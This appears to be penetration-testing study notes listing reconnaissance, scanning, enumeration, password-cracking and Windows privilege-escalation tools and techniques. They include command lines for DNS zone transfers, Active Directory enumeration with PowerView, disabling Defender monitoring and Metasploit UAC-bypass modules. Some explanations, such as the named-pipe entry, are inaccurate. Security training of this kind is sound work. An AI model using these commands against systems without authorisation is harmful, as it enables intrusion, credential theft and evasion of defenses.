
# Footprinting and Reconnaissance (OSINT - Information Gathering)

- Online platforms: Social media, people search sites and services, job portals, blogs, forums, groups, articles, etc
- Source code–based repositories (internal servers, self-hosted, third-party hosting - GitHub, GitLab, SourceForge, BitBucket) contain sensitive data, configuration files, SSH, SSL keys, source-code files, dynamic libraries
- Web Services:
	- Advance Search using Search Engines, Image Searches, Reverse Search
	- FTP Search Engine (NAPALM FTP Indexer, FreewareWeb FTP File Search, Mamont, Globalfilesearch.com)
	- IoT Search Engines (Shodan, Censys, ZoomEye - manufacturer details, geographical location, IP address, hostname, open ports of IoT device)
	- Google Dorks (Advanced search operators/queries in Google Search Engine to find information - sites, links, files, open FTP ports, services)
	- www.exploit-db.com (Exploit-DB is online archive of exploits, security vulnerabilities, and proof-of-concept code)
	- www.exploit-db.com/google-hacking-database (GHDB - Google Hacking Database is collection of advanced search queries - Google Dorks)
	- archive.org (Digital Library & Internet Archive Wayback Machine that explores archived versions of websites)
	- www.social-searcher.com - Social Accounts
	- whois.domaintools.com - WHOIS
	- search.censys.io - Domains, Subdomains, Hosts, OS, Infrastructure, Technologies used by site
	- www.netcraft.com/tools
	- dnsdumpster.com
	- pentest-tools.com
	- www.ip2location.com - Email Footprinting, Email Header Tracer
	- mxtoolbox.com
	- socialcatfish.com
	- shodan.io : search engine designed to detect devices and networks with vulnerabilities (connected to internet)
	- web-check.xyz : All-in-one OSINT tool for analysing any website
	- osint.sh : All in one Information Gathering Tools
	- osintframework.com : Collections of OSINT frameworks focused on gathering information from free tools and resources
	- www.semrush.com - SEO, content marketing, competitor research, PPC and social media marketing
- Extract Meta-deta from files:
	- exiftool : ExifTool is used to read and write metadata in various file types, such as JPEG images
	- pdfinfo : Portable Document Format (PDF) document information extractor (poppler-utils)
- CLI Tools:
	- whois : get whois information/record for domain
	- host : use for DNS lookups and convert names to IP addresses and vice versa
	- dig : Domain Information Groper (dig) retrieves information about DNS name servers
	- traceroute : route packets trace to network host
	- ip : show / manipulate routing, network devices, interfaces and tunnels (replaces deprecated: ifconfig, route, arp)
	- arp : show / manipulate Address Resolution Protocol (ARP) cache
	- tcpdump : TCP dump is packet analyser tool used to capture and analyse packets and network traffic in real-time over network
	- ifconfig : Interface Configuration (ifconfig) configures network interfaces (deprecated)
	- nslookup : Name Server Lookup (nsookup) queries DNS Servers interactively (deprecated)
	- netstat : print network connections, routing tables, interface statistics, masquerade connections, multicast memberships, etc. (deprecated)
	- route : show / manipulate the IP routing table (deprecated)
	- nslookup : query internet domain name servers (set type=a/cname)
	- photon : retrieve archived URLs of the target website from archive.org
	- theharvester : OSINT gathering tool (gathers names, emails, IPs, subdomains, and URLs by using multiple public resources)
	- sherlock - Search on social media accounts - personal info
	- whatweb : WhatWeb is a next-generation web scanner that identifies technologies used by websites
	- fierce : DNS reconnaissance tool locate non-contiguous IP space and hostnames against specified domains
	- dnsrecon : DNS (Domain Name System) reconnaissance tool
	- recon-ng : web reconnaissance framework used for penetration testing, vulnerability assessment
	- maltego : used to determine the relationships and real world links between people, groups of people, organizations, websites, Internet infrastructure, documents
	- FOCA : Fingerprinting Organizations with Collected Archives is a tool used mainly to find metadata and hidden information in the documents it scans
	- subfinder : subdomain discovery tool that helps attackers find valid subdomains for websites
	- sublist3r : fast subdomains enumeration tool for penetration testers
	- Recon-Dog : Reconnaissance Swiss Army Knife - uses APIs to collect information about the target system, including Censys, NS Lookup, Port Scan, CMS Detection, Whois Lookup, Honeypot Detection, Subdomain Finder, Reverse IP Lookup, and Technology Detection
	- BillCipher : Information gathering tools: DNS, Whois, GeoIP, Subnet, Port Scanner, Page Links, Zone Transfer, HTTP Header, Host Finder, IP Locator, Shared DNS, Robots.txt, Reverse IP, Email Finder, Subdomains, Admin Login, CloudFlare Bypass, Website Copier, Host Info
	- Wireshark : Wireshark is a network protocol analyzer that interactively captures and analyzes network traffic
AI Tools:
	- taranis.ai : advanced open source intelligence (OSINT) tool that leverages artificial intelligence to gather, analyze, and interpret publicly available data
	- ossinsight.io : OSS Insight uses AI to provide in-depth insights into the GitHub ecosystem, analyzing over 5 billion GitHub events
	- dorkgpt.com : AI-powered tool designed to assist Google Dorking, a technique used to find information that is not easily accessible through regular search queries
	- dorkgenius.com : AI-powered tool that automates Google Dorking and helps users generate advanced search queries to find specific information on the internet
	- googlewordsniper.eu : Google Word Sniper helps to refine search queries for more effective Google results. It identifies targeted keywords and phrases, making it easier to find specific information, hidden content, and niche data.
	- cylect.io : advanced AI-powered OSINT tool that integrates multiple databases into a user-friendly interface, providing a vast collection of resources for ethical hackers and enabling efficient and confident OSINT investigations
	- chatpdf.com : OSINT tool that leverages AI to analyze and extract information from PDF documents through a conversational interface
	- www.bardeen.ai : automation tool that can be used for OSINT by enabling users to streamline and automate data collection and analysis processes from various online sources
	- cobwebs.com : PenLink Cobwebs is an advanced AI-powered OSINT tool that specializes in gathering and analyzing data from various online sources. It offers comprehensive capabilities for collecting, processing, and visualizing information to support cybersecurity investigations.
	- exploreai.vercel.app : Explore AI is an AI-powered YouTube search engine that uses artificial intelligence to search for and extract information from YouTube videos, making it easier to access information for ethical hacking purposes.
	- app.anypicker.com : AnyPicker is a powerful visual web scraper and AI OSINT tool designed to extract data from websites without requiring coding skills.


--------------------------------------------------

# Network Scanning
Network scanning refers to a set of procedures used for identifying hosts, ports, and services in a network.

- nmap : Network Mapper scans networks to identify devices, open ports, services, and detect OS and service versions, automating network scanning
- hping3 : network tool used for security auditing and testing. It sends custom TCP/IP packets to hosts for tasks such as port scanning, firewall testing, network performance analysis, and DoS testing
- Metasploit : an open-source project that provides the infrastructure, content, and tools to perform penetration tests and extensive security auditing
- sx : command-line network scanner (github.com/v-byte-cpu/sx)
- Angry IP Scanner : Fast, lightweight tool for discovering devices on a network, scanning IPs, ports, and gathering host information (angryip.org)
- RustScan : Fast, modern port scanner designed to perform high-speed scanning of open ports on target machines (github.com/RustScan/RustScan)
- scanlogd : TCP port scan detection tool that detects and logs TCP port scans


# Paid Tools:
- MegaPing (magnetosoft.com)
- OpUtils (www.manageengine.com)
- SolarWinds Engineer’s Toolset (www.solarwinds.com/free-tools)
- NetScanTools Tools (www.netscantools.com/freeware.html)
- PRTG Network Monitor (www.paessler.com)
- Colasoft Ping Tool (www.colasoft.com)
- Advanced IP Scanner (www.advanced-ip-scanner.com)
- Splunk Enterprise Security (www.splunk.com)


--------------------------------------------------

# Enumeration
Enumeration is the process of extracting usernames, machine names, network resources, shares, and services from a system or network. In the enumeration phase, an attacker creates active connections with the system and sends directed queries to gain more information about the target.

- knockpy : Knock is a tool designed to quickly enumerate subdomains of a target domain through passive reconnaissance and dictionary scanning (passive)
- raccoon : Raccoon is a high-performance offensive security tool for reconnaissance and vulnerability scanning (active)
- subfinder : Fast passive subdomain enumeration tool that discovers valid subdomains using online passive sources (passive)
- turbolist3r : TurboList3r is a subdomain enumeration tool with automated analysis, focused on subdomain takeover

- nbtscan : Scan network for NetBIOS name information
- snmp-check : SNMP device enumerator
- snmpwalk : retrieve a subtree of management values using SNMP GETNEXT requests
- ldapsearch : LDAP search tool (ldapsearch ldap://<ip> -x)
- ntptrace : trace chain of NTP servers back to primary source
- rpcinfo : report RPC information - NFS (rpcinfo -p <ip>)
- showmount : show mount information for an NFS server (showmount -e <ip>)
- RPCScan : RPCScan communicates with RPC services and checks misconfigurations on NFS shares
- SuperEnum : SuperEnum includes a script that performs the basic enumeration of any open port
- DNS Zone Transfer with Dig:
	- dig ns <ip>
	- dig @<domain_name_server> <ip> axfr
- DNS Zone Transfer with DNSRecon: dnsrecon -t axfr -d <ip>
- DNS Cache Snooping:
	- Non-recursive method: dig @<dns_server_ip> <ip> A +norecurse
	- Recursive method: dig @<dns_server_ip> <ip> A +recurse
- DNSSEC Zone Walking:
	- LDNS: ldns-walk @<dns_server_ip> <ip>
	- DNSRecon: dnsrecon -z -d <ip>
- DNS Enumeration with OWASP Amass:
	- amass enum -d <ip>
	- Passive: amass enum -passive -d <ip>
	- Active enumeration through brute-forcing with specified wordlist: amass enum -active -d <ip> /usr/share/wordlists/amass/all.txt
- IPsec Enumeration - ISAKMP Port status: nmap –sU –p 500 <ip>
- ike-scan : Discover and fingerprint IKE (Internet Key Exchange) hosts (IPsec VPN servers)
- VoIP Enumeration with Session Initiation Protocol (SIP) protocol: svmap <ip>
- RPC Enumeration (Identify RPC service running):
	- nmap -sR <ip>
	- nmap -T4 –A <ip>
- SMB Enumeration (SMB service running):
	- nmap -p 445 -A <ip>
	- enum4linux : enumerate information from Windows and Samba systems


--------------------------------------------------

# Vulnerability Analysis/Assessment

# Vulnerability Classification:
- Misconfigurations/Weak Configurations
	- Network Misconfigurations
		- Insecure Protocols
		- Open Ports and Services
		- Errors
		- Weak Encryption
	- Host Misconfigurations
		- Open Permissions
		- Unsecured Root Accounts
- Application Flaws
	- Buffer Overflows
	- Memory Leaks (Valgrind)
	- Resource Exhaustion
	- Integer Overflows
	- Null Pointer/Object Dereference
	- DLL (Dynamic Link Library) Injection
	- Race Conditions
		- Time of Check/Time of Use
	- Improper Input Handling
	- Improper Error Handling
	- Code Signing Weakness
- Poor Patch Management
	- Unpatched Servers
	- Unpatched Firmware
	- Unpatched OS
	- Unpatched Applications
- Design Flaws
- Third-Party Risks
	- Vendor management
		- System integration
		- Lack of vendor support
	- Supply-chain risks
	- Outsourced code development
	- Data storage
	- Cloud-based vs. On-premises risks
- Default Installations/Default Configurations
- Operating System Flaws
- Default Passwords
- Zero-Day Vulnerabilities
- Legacy Platform Vulnerabilities
- System Sprawl/Undocumented Assets
- Improper Certificate and Key Management

# Types of Vulnerability Scanning:
- External Scanning
- Internal Scanning
- Host-based scanning
- Network-based Scanning
- Application Scanning
- Database Scanning
- Wireless Network Scanning
- Distributed Scanning
- Credentialed/Authenticated Scanning
- Non-Credentialed/Unauthenticated Scanning
- Manual Scanning
- Automated Scanning
- Cloud-based Scanning
- Mobile Application Scanning
- Physical Security Vulnerability Scanning
- IoT Device Vulnerability Scanning

# Vulnerability Assessment Solutions:
- Product-Based Solutions
- Service-Based Solutions
- Tree-Based Assessment
- Inference-Based Assessment

# Types of Vulnerability Assessment Tools:
- Host-Based Vulnerability Assessment Tools
- Depth Assessment Tools
- Application-Layer Vulnerability Assessment Tools
- Scope Assessment Tools
- Active and Passive Tools
- Location and Data Examination Tools
	- Network-Based Scanner
	- Agent-Based Scanner
	- Proxy Scanner
	- Cluster scanner

# Vulnerability Scoring Systems and Databases
- Common Vulnerability Scoring System (CVSS) - www.first.org
- MITRE Common Vulnerabilities and Exposures (CVE) - cve.mitre.org
- National Vulnerability Database (NVD) - nvd.nist.gov
- Common Weakness Enumeration (CWE) - cwe.mitre.org
- Exploit Database - www.exploit-db.com
- Vulnerability Database - vuldb.com
- Open Source Vulnerability Database - osv.dev

# Vulnerability Research Resources
- Microsoft Security Response Center (MSRC) - msrc.microsoft.com
- HackerStorm - www.hackerstorm.co.uk

# Vulnerability Assessment Tools
- nikto : Scan web server for known vulnerabilities
- skipfish : web application security scanner
- OpenVAS (www.openvas.org)
	- sudo docker run -d -p 443:443 --name openvas mikesplain/openvas
	- Launch OpenVAS: https://127.0.0.1 (Username: admin; Password: admin)
- Snort : Open Source Network Intrusion Prevention System (IPS)
- SmartScanner : AI-powered web vulnerability scanner that detects a wide range of threats, from SQL Injection and XSS to misconfigurations and cryptographic flaws. It supports various technologies, including REST APIs, modern frameworks, and popular CMS platforms, offering an intuitive interface and detailed reports. (www.thesmartscanner.com)


--------------------------------------------------

# Attack Tools
- nc : Netcat is a versatile networking tool for establishing arbitrary TCP and UDP connections, allowing reading from and writing to network connections
- gobuster : Gobuster is a Go-based tool for brute-forcing URIs, DNS subdomains, virtual hosts, and discovering open Amazon S3 buckets, Google Cloud buckets, and TFTP servers
- sqlmap : sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers
- dnsspoof : dnsspoof is a DNS spoofer that intercepts DNS responses from the router and replaces them with spoofed DNS responses

# Assist Tools:
- Burp Suite : Burp Suite is a Java-based framework for web application penetration testing, allowing interception and manipulation of HTTP/HTTPS traffic between a browser and server. It includes tools for scanning, fuzzing, and analyzing web traffic, making it essential for manual web testing.

# Digital Forensics & Data Recovery:
- teskdsk : TestDisk is used to recover lost or damaged partitions and boot sectors
- photorec : PhotoRec is used to recover files from corrupted or formatted disks, or when the file system is damaged
- FTK : Forensic Toolkit is a forensic suite used for analyzing disk drives, memory, and emails


--------------------------------------------------

# System Hacking

## Gaining Access:

- Password Recovery/Cracking/Attacks Tools
	- Windows
		- pwdump7 : extracts LM and NTLM password hashes of local user accounts from the Security Account Manager (SAM) database
		- Rubeus : retrieve a TGT based on a user password/hash
		- Mimikatz : extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory, as well as perform pass-the-hash, pass-the-ticket, and create Golden Tickets
		- DSInternals : Directory Services Internals PowerShell Module and Framework
		- adfsbrute : script to test credentials against Active Directory Federation Services (ADFS), allowing password spraying or bruteforce attacks
		- CrackMapExec : CME is versatile post-exploitation and lateral movement tool designed for penetration testing in Active Directory environments
		- Impacket : Impacket is a collection of Python classes for working with network protocols
		- L0phtCrack : L0phtCrack is a tool designed to audit passwords and recover applications
		- Responder : LLMNR, NBT-NS and MDNS poisoner
		- brutus : brute-force password-cracking tool, primarily designed for older Windows systems
		- Vindicate : LLMNR/NBNS/mDNS Spoofing Detection Toolkit for network administrators
		- Respounder : detects presence of responder in the network
		- got-responded : detect LLMNR and NBT-NS spoofing
	- crunch : generates wordlists based on specified character sets, lengths, and patterns for use in dictionary attacks
	- CeWL : Custom Word List Generator generates custom wordlists by crawling websites and extracting words based on specified parameters
	- hashID : tool to identify different types of hashes
	- John the Ripper : advanced offline password cracker that supports hundreds of hash and cipher types
	- Hashcat : Password recovery utility
	- hashcat-utils : powerful and versatile password recovery utility supporting a wide range of hash algorithms
	- RainbowCrack : password-cracking tool that uses rainbow tables to recover plaintext passwords from their hashed values
	- Hydra : fast and flexible password-cracking tool used for brute-force and dictionary attacks against various network services and protocols
	- Patator : multi-purpose brute-forcer with modular design and flexible usage
	- Ncrack : high-speed network authentication cracking tool
	- PyCrack : Advanced password-cracking tool supporting brute force, dictionary, and random attacks, capable of cracking files and hashes (e.g. PDF, ZIP, MS Excel, MS Word, MS PowerPoint, MD5, SHA-224, SHA-256, etc.)
	- Aircrack-ng : complete suite of tools to assess WiFi network security
	- BruteX : automates brute-force attacks against all services running on target
	- Secure Shell Bruteforcer : SSB - faster & simpler way to bruteforce SSH server

- Password Recovery Tools (Windows)
	- Elcomsoft Distributed Password Recovery (www.elcomsoft.com)
	- Lazesoft Recover My Password (www.lazesoft.com)
	- Passper WinSenior (passper.imyfone.com)
	- Passware Kit Forensic (www.passware.com)
	- PCUnlocker (www.top-password.com)

- Default Passwords
	- 192-168-1-1ip.mobi
	- cirt.net
	- default-password.info
	- www.fortypoundhead.com
	- www.routerpasswords.com

- Password Attacks
	- Active Online (Windows)
		- Hash Injection/Pass-the-Hash (PtH) Attack : Technique where an attacker uses a stolen NTLM hash instead of the plaintext password to authenticate and gain access to systems or resources - Mimikatz and Impacket (psexec.py)
		- LLMNR/NBT-NS Poisoning : Network attack that exploits the LLMNR and NBT-NS protocols to capture authentication credentials (NTLM hashes) from target system - Responder
		- Internal Monologue Attack : Stealthy technique used to extract NTLM hashes from compromised Windows machine without generating network traffic - Invoke-InternalMonologue
		- Cracking Kerberos Password : Attack involves brute-forcing or dictionary attacks on the encrypted password hashes associated with Kerberos authentication tickets to reveal plaintext passwords
			- AS-REP Roasting (Cracking TGT): Extract user accounts hash that do not require preauthentication then crack encrypted TGT hash (JtR/Hashcat) - Impacket (GetNPUsers.py)
			- Kerberoasting (Cracking TGS): Attacker authenticates to the Kerberos network, obtains a TGT, requests TGS tickets for specific services encrypted with service account hashes, and extracts them using tools like Rubeus (gain access to higher-privileged service accounts)
		- Pass-the-Ticket Attack : Using a stolen Kerberos ticket (TGT or TGS) to authenticate to other services or systems without needing the user's password, allowing attackers to gain unauthorized access using the victim's ticket - Mimikatz, Rubeus, Windows Credentials Editor
		- NTLM Relay Attack : Network attack where an attacker intercepts and relays NTLM authentication traffic to authenticate as the victim on another system without cracking the credentials - Responder, Impacket (ntlmrelayx)
	- Passive Online
		- Wire Sniffing : Packet sniffing is a form of wire sniffing or wiretapping in which hackers sniff credentials during transit by capturing Internet packets - Wireshark, tcpdump
		- Man-in-the-Middle and Replay Attacks
	- Offline
		- Rainbow Table Attack : Password-cracking technique that uses precomputed hash-value pairs stored in a table to quickly match and reverse hash values into plaintext passwords, bypassing the need for real-time brute-forcing - RainbowCrack (rtgen)
		- Distributed Network Attack : Brute-force technique that uses multiple distributed systems to crack encrypted files or passwords by leveraging their combined computational power - Exterro Password Recovery Toolkit (PRTK)

- Vulnerability Exploitation Tools
	- WES-NG : Windows Exploit Suggester - Next Generation is python-based tool that analyzes the output of the Windows systeminfo utility to identify vulnerabilities affecting the system and corresponding exploits
	- Reverse Shell Generator : Online Reverse Shell generator with Local Storage functionality, URI & Base64 Encoding, MSFVenom Generator, and Raw Mode.
		- www.revshells.com
		- Local: docker run -d -p 80:80 reverse_shell_generator

- AI-Powered Vulnerability Exploitation Tools
	- Nebula : AI-Powered Ethical Hacking Assistant
	- DeepExploit : DeepExploit utilizes a deep learning model to automate vulnerability identification and exploitation

- Vulnerability Exploitation Attacks/Tools
	- Buffer Overflow
		- Types:
			- Stack Based Buffer Overflow (smaller, static buffers)
			- Heap Based Buffer Overflow (larger, dynamic buffers)
		- Windows Buffer Overflow Exploitation
			- Steps involved in exploiting Windows based buffer overflow vulnerability:
				- Perform spiking: with netcat
				- Perform fuzzing: Fuzzing sends data to cause a buffer overflow, overwriting the EIP and revealing its location to inject shellcode
				- Identify the offset: Attackers use Metasploit's pattern_create and pattern_offset tools to identify the offset and exact location where the EIP register is being overwritten
				- Overwrite the EIP register: Overwriting the EIP identifies whether a register can be controlled and overwritten with malicious shellcode
				- Identify bad characters: Before injecting the shellcode into the EIP register, attackers identify bad characters that may cause issues in the shellcode
				- Identify the right module: Identify the right module of a vulnerable server that lacks memory protection
				- Generate shellcode: Generate the shellcode (with the msfvenom command) and inject it into the EIP register to gain shell access to the target vulnerable server
				- Gain root access
		- Return-Oriented Programming (ROP) Attack
		- Bypassing ASLR (Address Space Layout randomization) and DEP (Data Execution Prevention) Security Mechanism
			- Heap Spraying - flooding free space of target process’s memory heap
			- JIT (Just-In-Time) Spraying - execute arbitrary code by exploiting vulnerabilities in JIT compilation (web browsers)
	- Exploit Chaining
	- Domain Mapping and Exploitation with Bloodhound
	- Post Active Directory (AD) Enumeration using PowerView
		- Note: Disable the security monitoring option: Set-MpPreference -DisableRealtimeMonitoring $true
		- Enumerating Domain Users:
			- Get-NetUser : Retrieves information related to the current domain user
			- Get-NetLoggedon -ComputerName <computer-name> : Retrieves information related to the current active domain users
			- Get-UserProperty –Properties pwdlastset : Retrieves the date and time of the password last set for each domain user
			- Find-LocalAdminAccess : Retrieves users having local administrative privileges in the current domain (requires administrator privileges)
			- Invoke-EnumerateLocalAdmin : Retrieves users having local administrative privileges in the network/domain (requires administrator privileges)
			- Get-NetSession -ComputerName <computer_name> : Retrieves information related to the current user logged into the machine
		- Enumerating Domains:
			- Get-ADDomain : Retrieves information related to the current domain including its domain controllers (DCs)
			- Get-NetDomain : Retrieves information related to the current domain including its network/domain controllers
			- Get-DomainSID : Retrieves the security ID (SID) of the current domain
		- Enumerating Domain Policy:
			- Get-DomainPolicy : Retrieves the policy used by the current domain
			- (Get-DomainPolicy)."SystemAccess" : Retrieves information related to the policy configurations of the domain’s system access
			- (Get-DomainPolicy)."kerberospolicy : Retrieves information related to the domain’s Kerberos policy
		- Enumerating Domain Controllers (DCs)
			- Get-NetDomainController : Retrieves information related to the current domain controller (DC)
		- Enumerating Domain Computers:
			- Get-NetComputer : Retrieves the list of all computers existing in the current domain
			- Get-NetComputer | select operatingsystem,dnshostname : Retrieves the list of all operating systems and DNS host names in the current domain
			- Get-NetComputer - OperatingSystem "*Server 2022*" : Retrieves all the domain computers running on Windows Server 2022
			- Get-NetComputer -Ping : Retrieves all the live hosts or pingable host systems available in the current domain
		- Enumerating Domain Groups :
			- Get-NetGroup : Retrieves the list of all groups existing in the current domain
			- Get-NetGroup -Domain <targetdomain> : Retrieves the list of all groups existing in the specified domain
			- Get-NetGroup 'Domain Administrators' : Retrieves all information related to the specified group
			- Get-NetGroup “*admin*” : Retrieves all the groups containing admin in the group name
			- Get-NetGroupMember - GroupName "Domain Admins" : Retrieves all the members in the specified group
			- Get-NetGroup -UserName <"username"> : Retrieves the group name of the specified domain user
			- Get-NetLocalGroup - ComputerName <computername> : Retrieves all the group names of the specified domain computer
			- Get-NetLoggedon - ComputerName <DomainName> : Retrieves all the active logged-in users of the specified domain (requires administrator privileges)
			- Get-LastLoggedOn - ComputerName <DomainName> : Retrieves the last-logged-in user of the specified domain
		- Enumerating Domain Shares:
			- Invoke-ShareFinder -Verbose : Retrieves shares on the hosts in the current domain
			- Get-NetShare : Retrieves all the network shares existing in the current domain
			- Get-NetFileServer -Verbose : Retrieves the file server of the current domain
			- Invoke-FileFinder : Retrieves all the files in the current domain including files that store credentials
			- Find-DomainShare : Retrieves the shares in the domain
		- Enumerating Group Policies and OUs:
			- Get-NetGPO Get-NetGPO| select displayname : Retrieves the list of all the GPOs present in the current domain
			- Get-NetOU : Retrieves all the OUs present in the current domain
		- Enumerating Access-Control Lists (ACLs):
			- Get-NetPGO | %(Get-ObjectAcl -ResolveGUIDs -Name $_.Name) : numerating Access-Control Lists
			- Get-ObjectAcl - SamAccountName "users" - ResolveGUIDs : Retrieves the details of the ACLs for a specific group (users)
			- Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs - Name $_.Name} : Retrieves the users who have modification rights for a group
			- Invoke-ACLScanner - ResolveGUIDs : Retrieves all information about ACEs
			- Get-PathAcl -Path \\Windows11\Users : Retrieves the ACL linked with a specific path (works only with the shared folder)
			- Get-Acl : Retrieves the security descriptions for a resource such as a file or registry key
		- Enumerating Domain Trust and Forests:
			- Get-NetForest : Retrieves the information of the current forestRetrieves the information of the current forest
			- Get-NetForest -Forest <forest> : Retrieves the information of the specified forest
			- Get-NetForestDomain : Retrieves all domains in the current forest
			- Get-NetForestCatalog : Retrieves the details of the global catalogs for the current forest
			- Get-NetForestCatalog - Forest <forest> : Retrieves the details of the global catalogs for the specified forest
	- linWinPwn : Bash script that integrates Active Directory tools for enumeration (LDAP, RPC, ADCS, MSSQL, Kerberos), vulnerability checks (noPac, ZeroLogon, MS17-010, MS14-068), object modifications (password change, group additions, RBCD, Shadow Credentials), and password dumping (secretsdump, lsassy, nanodump, DonPAPI)
	- GhostPack Seatbelt : Seatbelt performs a number of security-oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives (github.com/GhostPack/Seatbelt)
	- Buffer Overflow Detection Tools:
		- OllyDbg : OllyDbg is an assembler-level debugger for Microsoft Windows that dynamically traces stack frames and program execution, logging arguments of known functions
		- flawfinder : program that examines C/C++ source code and reports possible security weaknesses sorted by risk level
		- Splint : tool for statically checking C programs for security vulnerabilities and coding mistakes
		- Valgrind : An instrumentation framework for building dynamic analysis tools, Valgrind includes tools that can automatically detect memory management and threading bugs, as well as profile programs in detail (valgrind.org/info/tools.html)


## Privilege Escalation

- Types of Privilege Escalation
	- Horizontal Privilege Escalation (Same Level Privileges)
	- Vertical Privilege Escalation (Elevation of Privileges)
- Methods of Privilege Escalation
	- Privilege Escalation by Exploiting Vulnerabilities
	- Privilege Escalation Using DLL (Dynamic Link Library) Hijacking - Windows:
		- Spartacus : An automated DLL/COM hijacking toolkit that analyzes SysInternals Process Monitor logs to identify, exploit, and generate payloads for DLL and COM hijacking vulnerabilities
		- DLLirant : Tool to automatize the DLL Hijacking and DLL Proxying researches on a specified binary 
		- ImpulsiveDLLHijack : Automates the discovery and exploitation of DLL hijacking vulnerabilities in target binaries, with the hijacked paths identified later being weaponized during Red Team operations to evade EDR systems
		- PowerSploit : PowerShell Post-Exploitation Framework that is a collection of Microsoft PowerShell modules that aid penetration testers during all phases of an assessment
	- Privilege Escalation Using Dylib (dynamic library) Hijacking - MacOS:
		- Dylib Hijack Scanner : Scans a computer for applications that are either susceptible to dylib hijacking or have already been hijacked
	- Privilege Escalation Using Spectre and Meltdown Vulnerabilities:
		- Spectre and Meltdown are vulnerabilities found in the design of modern processor chips (AMD, ARM, and Intel). These vulnerabilities arise from performance and CPU optimizations in processors, such as branch prediction, out-of-order execution, caching, and speculative execution. Attackers can exploit these vulnerabilities to gain unauthorized access and steal sensitive system information, such as credentials and secret keys stored in the application's memory, to escalate privileges.
		- Spectre Vulnerability: Attackers can exploit this vulnerability to read adjacent memory locations of a process, accessing unauthorized information, and may even gain access to kernel memory or perform web-based attacks using JavaScript.
		- Meltdown Vulnerability: Attackers can exploit this vulnerability to escalate privileges by forcing an unprivileged process to read adjacent memory locations, such as kernel and physical memory, thereby revealing critical system information like credentials and private keys.
	- Privilege Escalation Using Named Pipe Impersonation - Windows:
		- In Windows OS, named pipes are used to facilitate legitimate communication between running processes.
		- In this technique, messages are exchanged between processes using a file. For example, if process A wants to send a message to process B, it writes the message to a file, and process B reads the message from that file.
	- Privilege Escalation by Exploiting Misconfigured Services - Windows:
		- Unquoted Service Paths: In Windows, services with unquoted executable paths can be exploited by attackers to elevate privileges when running under SYSTEM privileges.
		- Service Object Permissions: Misconfigured service permissions can allow attackers to modify or reconfigure service attributes, add users to the administrator group, and elevate privileges.
		- Unattended Installs: Unattended installation information, such as configuration settings used during the installation process, is stored in the Unattend.xml file and can be exploited by attackers to escalate privileges.
		- Modifiable Registry Autoruns and Configurations: Modifying certain registry entries that control the execution of programs, often exploiting weak or misconfigured permissions to gain higher privileges, execute malicious code, or persist on the system.
	- Pivoting and Relaying to Hack External Machines:
		- Pivoting and relaying are techniques used to gather detailed information about a target network after successfully compromising a target system. The compromised system acts as a bridge, enabling attackers to penetrate deeper into the target network and access other systems and resources that would otherwise be inaccessible from the attacking system.
		- Pivoting: Attackers use the pivoting technique to compromise a system, gain remote shell access on it, and further bypass the firewall to pivot via the compromised system to access other vulnerable systems in the network.
		- Relaying: Attackers use the relaying technique to access resources present on other systems via the compromised system in such a way that the requests to access the resources are coming from the initially compromised system.
	- Privilege Escalation Using Misconfigured NFS - Windows:
		- Attackers attempt to enumerate a misconfigured Network File System (NFS) to exploit it and gain root-level access to a remote server, as such misconfigurations allow them to escalate privileges from a regular or low-privileged user account.
	- Privilege Escalation by Bypassing User Account Control (UAC):
		- When attackers fail to escalate privileges with a simple payload, they attempt to evade Windows security features like UAC and exploit certain Windows applications to gain system-level access without triggering a UAC notification, even when UAC protection is enabled.
		- Techniques to Bypassing UAC Protection Using Metasploit:
			- Bypassing UAC Protection - exploit/windows/local/bypassuac
			- Through FodHelper Registry Key - exploit/windows/local/bypassuac_fodhelper
			- Through Eventvwr Registry Key - exploit/windows/local/bypassuac_eventvwr
			- Through COM Handler Hijacking - exploit/windows/local/bypassuac_comhijack
			- Via Memory Injection - exploit/windows/local/bypassuac_injection
	- Privilege Escalation by Abusing Boot or Logon Initialization Scripts:
		- Attackers exploit boot or logon initialization scripts to escalate privileges or maintain persistence on a target system. These scripts also enable attackers to perform various administrative tasks, allowing them to execute other programs on the system.
		- Windows Logon Script : Attackers establish persistence and escalate privileges on a system by embedding the path to their script in the registry key (HKEY_CURRENT_USER\Environment\UserInitMprLogonScript)
		- Mac Logon Script : In macOS, logon scripts are known as login hooks and allow attackers to establish persistence on a system, as they are executed automatically during system login. Attackers exploit these hooks to inject a malicious payload, elevate privileges, and maintain persistence.
		- Network Logon Scripts : Network logon scripts are assigned through Active Directory or GPOs. Attackers exploit these scripts to obtain local or administrator credentials, depending on the access configuration.
		- RC Scripts : Attackers exploit RC scripts by embedding a malicious binary, shell, or path in RC scripts such as rc.common or rc.local on Unix-based systems to escalate privileges and maintain persistence.
		- Startup Items : Attackers create malicious files or folders within the /Library/StartupItems directory to maintain persistence. Startup items are executed during bootup with root-level privileges.
	- Privilege Escalation by Modifying Domain Policy:
		- The domain policy consists of configuration settings that can be applied between domains in a forest environment. Attackers modify domain settings by altering group policies and trust relationships between domains. They may also deploy a fake domain controller to maintain a foothold and escalate privileges.
		- Group Policy Modification:
			- Group policies manage resources and configuration settings such as security options, registry keys, and domain members. By default, all user accounts have read access to GPOs, while write access is restricted to specific users or groups within the domain.
			- Attackers exploit the path <DOMAIN>\SYSVOL\<DOMAIN>\Policies\ to access and modify domain group policies, enabling activities like creating new accounts, disabling or modifying internal tools, transferring ingress tools, executing unwanted services, and extracting passwords in plaintext.
			- At <GPO_PATH>\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml, attackers can modify the file to create a malicious scheduled task or job using scripts like New-GPOImmediateTask.
			- At <GPO_PATH>\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf, attackers may alter user rights (e.g., SeEnableDelegationPrivilege) to create a backdoor and then control the user account to modify group policy settings.
		- Domain Trust Modification:
			- Domain trust objects provide information such as credentials, accounts, and authentication and authorization mechanisms used by domains. C:\Windows\system32>nltest /domain_trusts
			- Attackers use this utility to gather information about trusted domains and leverage it to add a domain trust or modify existing trust settings, enabling privilege escalation through Kerberoasting and pass-the-ticket attacks.
	- Retrieving Password Hashes of Other Domain Controllers Using DCSync Attack:
		- A domain controller (DC) in a Windows environment securely validates user requests, manages user accounts, provides authentication, and enforces domain security policies. Directory replication ensures data consistency across DCs, so updates like password changes are reflected across all controllers.
